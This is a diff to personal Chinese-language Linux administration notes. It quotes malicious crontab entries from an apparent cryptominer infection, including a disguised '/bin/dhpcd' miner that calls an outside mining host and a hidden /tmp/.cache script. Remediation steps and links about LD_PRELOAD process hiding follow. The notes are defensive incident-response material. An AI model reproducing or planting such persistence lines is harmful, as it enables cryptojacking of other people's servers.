@@ -275,6 +275,7 @@ unixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunix
             @daily /tmp/.cache/.daily-tick >> /dev/null 2>&1
             3 * * * * /bin/dhpcd -o xxx.minemxr.com:80 -B >/dev/null 2>/dev/null
         修改root 远程密码。 设置文件禁止修改(chattr +i -R .cache/)。 移除脚本。审计对定时任务的修改记录。
+
     
         @reboot sleep 60; /root/bakup.sh  开机后等待一分钟，执行脚本
         @reboot Run once, at startup.
@@ -285,6 +286,7 @@ unixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunix
         @daily Run once a day, “0 0 * * *”
         @midnight (same as @daily)
         @hourly Run once an hour, “0 * * * *”
+        参考，[](https://www.freebuf.com/articles/system/245636.html)
 
 6. 查看服务器CPU，运存情况
     1. cat /proc/cpuinfo  | grep processor | wc -l      4个CPU处理器
@@ -857,3 +859,13 @@ powermenu:  rofi
 
 mysql全量备份， 与binlog 将误删数据恢复
     mysqldump -uroot -p -B -F -R -x --master-data=2 test-l01| gzip > test-l01.sql.gz
+
+
+2. 参考， 入侵自己的服务器，https://www.1024sou.com/article/22212.html
+    linux遭入侵，挖矿进程被隐藏， https://mp.weixin.qq.com/s/1AF5cgo_hJ096LmX7ZHitA
+        ld.so.preload文件, 动态链接库预加载机制
+        后边，写到centos7.md 文件-隐藏进程-hideprocess 中去。。
+    linux watchdogs 隐藏挖矿病毒， https://www.anquanke.com/post/id/171523%EF%BC%8C%E8%BF%99%E8%B5%B7%E4%BA%8B%E4%BB%B6%E4%B8%AD%EF%BC%8C%E6%8A%8ALD_PRELOAD%E7%9B%B8%E5%85%B3%E7%9A%84%E4%BF%A1%E6%81%AF%E4%B9%9F%E5%9C%A8Hook%E6%97%B6%E8%BF%9B%E8%A1%8C%E4%BA%86%E8%BF%87%E6%BB%A4%E3%80%82
+    云计算， https://daimajiaoliu.com/daima/479c7e0cc100404
+
+3. 
